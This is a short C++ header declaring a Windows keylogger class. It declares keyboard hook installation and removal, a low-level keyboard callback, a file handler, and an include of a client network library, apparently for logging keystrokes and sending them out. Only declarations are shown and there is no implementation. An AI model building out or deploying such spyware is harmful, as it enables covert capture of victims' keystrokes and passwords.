#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <string>
#include <Windows.h>
#include "../lib/ClientNetwork.hpp"
#include "../lib/FileHandler.hpp"

class Keylogger {
    public:
        Keylogger(const std::string& filename);


        void InstallHook();
        void UninstallHook();
        void Run();

    private:
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static Keylogger* instance;

        HHOOK hook;
        FileHandler fileHandler;
};


#endif // KEYLOGGER_HPP